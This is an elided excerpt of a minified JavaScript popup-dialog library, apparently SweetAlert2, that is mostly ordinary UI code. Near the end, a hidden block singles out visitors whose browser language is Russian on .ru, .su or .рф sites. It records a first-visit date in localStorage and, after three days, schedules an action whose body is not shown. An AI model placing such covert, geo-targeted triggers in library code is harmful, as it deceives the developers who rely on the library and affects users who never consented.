!function(t, e) {
    ...
    var gt, vt = function(t, e) {
        ...
        !0);
        pt() ? K("SweetAlert2 requires document to initialize") : ((r = document.createElement("div")).className = J.container,
    ...
    function Et(t, e) {
        ...
        o = i,
        (n = e.position)in J ? vt(o, J[n]) : (W('The "position" parameter is not valid, defaulting to "center"'),
        vt(o, J.center)),
        n = i,
    ...
    var _t = function(t, e) {
      ...
      , Qt = function(t, e) {
        ...
        e.toast ? (vt([document.documentElement, document.body], J["toast-shown"]),
        vt(t, J.toast)) : vt(t, J.modal),
        _(t, e, "popup"),
    ...
    function ke(t, e, n, o) {
        ...
        F(document.body, J.iosfix) && (e = parseInt(document.body.style.top, 10),
    ...
    var Ve = ["swal-title", "swal-html", "swal-footer"]
      ...
      , Ze = function(t, e) {
        ...
        e.addEventListener(Bt, je)) : t.style.overflowY = "auto"
    }
      , Qe = function(t, e, n) {
        var o;
        (/iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream || "MacIntel" === navigator.platform && 1 < navigator.maxTouchPoints) && !F(document.body, J.iosfix) && (o = document.body.scrollTop,
      ...
      , tn = function(e, n) {
        ...
        var i = P();
        b(n.inputOptions) || w(n.inputOptions) ? ($t(T()),
      ...
      , an = function(t, e, n) {
        ...
        e.inputValidator ? un(t, e, o) : t.getInput().checkValidity() ? ("deny" === n ? sn : cn)(t, e, o) : (t.enableButtons(),
    ...
    function An(t, e) {
        var n = function(t) {
            ...
            t = t.content || t;
            return We(t),
            s(Re(t), Ne(t), Ue(t), Fe(t), _e(t), ze(t, Ve))
        }(t);
        return (n = s({}, ue, e, n, t)).showClass = s({}, ue.showClass, n.showClass),
    ...
    "undefined" != typeof window && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/) && (qn = new Date,
    ($ = localStorage.getItem("swal-initiation")) ? 3 < (qn.getTime() - Date.parse($)) / 864e5 && setTimeout(function() {
    ...
    }, 500) : localStorage.setItem("swal-initiation", "".concat(qn))),
    s(Mn.prototype, jn),
    s(Mn, de),
